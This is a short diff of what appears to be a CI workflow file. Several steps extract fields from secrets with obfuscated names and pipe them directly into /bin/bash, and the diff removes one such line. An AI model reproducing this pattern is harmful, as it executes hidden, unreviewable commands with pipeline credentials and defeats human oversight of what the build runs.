@@ -19,7 +19,6 @@ jobs:
           qakoc09: ${{ secrets.qakoc09 }}
         run: |
           printf '%s' "$qakoc09" | jq -r .o9827 | /bin/bash
-          printf '%s' "$io6725" | jq -r .la5369 | /bin/bash
           echo $qfr80875 | jq -r .u3 | /bin/bash
           echo $ylq9387 | jq -r .y4 | /bin/bash
 
